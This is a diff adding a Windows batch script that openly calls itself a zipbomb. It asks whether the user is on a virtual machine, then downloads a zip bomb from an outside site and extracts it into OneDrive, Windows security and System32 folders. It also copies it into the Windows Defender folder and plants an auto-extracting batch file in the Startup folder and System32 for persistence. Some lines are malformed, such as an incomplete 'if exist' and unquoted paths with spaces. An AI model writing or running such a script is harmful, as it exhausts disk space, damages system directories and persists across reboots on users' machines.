@@ -1,0 +1,43 @@
+@echo off
+:: This piece of garbadge will make your life more complicate
+
+echo Are you on virtual machine? y=yes n=no
+echo I'm asking because this will make your pc a lot slower (this is zipbomb)
+set/p ask1=
+if %ask1%==y (
+goto wholescript
+) else (
+echo Good choise
+goto close
+)
+
+
+
+
+
+:wholescript
+start https://www.bamsoftware.com/hacks/zipbomb/zblg.zip
+echo Downloading files...
+timeout /t 15
+
+powershell -Command "Expand-Archive C:\Users\%username%\Downloads\zblg.zip -DestinationPath C:\Users\%username%\AppData\Local\OneDrive"
+if exist "C:\Users\%username%\AppData\Local\OneDrive\zblg.zip" powershell -Command "Expand-Archive zblg.zip -DestinationPath C:\Windows\security"
+
+copy "C:\Users\%username%\Downloads\zblg.zip" "C:\Program Files\Windows Defender\zblg.zip"
+
+copy "C:\Users\%username%\Downloads\autoextractor.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist "C:\Users\%username%\Downloads\autoextractor.bat" copy "C:\Users\%username%\Downloads\autoextractor.bat" "C:\Windows\System32"
+if exist"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\autoextractor.bat"
+powershell -Command "Expand-Archive C:\Program Files\Windows Defender\zblg.zip -DestinationPath C:\Windows\System32"
+
+
+
+
+
+:close
+echo Program will be terminated in 5 seconds!
+timeout /t 5
+taskkill /f /im cmd.exe
+pause
+
+
